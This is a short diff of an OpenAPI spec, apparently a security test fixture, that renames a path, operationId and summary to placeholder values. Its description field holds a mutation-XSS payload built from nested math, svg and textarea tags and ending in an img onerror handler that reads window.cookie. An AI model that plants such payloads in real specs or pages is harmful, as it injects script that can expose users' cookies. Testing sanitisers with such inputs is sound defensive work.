@@ -4,12 +4,12 @@ info:
   description: |
       <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.cookie)'>">
 paths:
-  /qqqqq:
+  /123:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
         0: 
-      operationId: findAccounts
-      summary: [Client account information]
+      operationId: 123
+      summary: 123
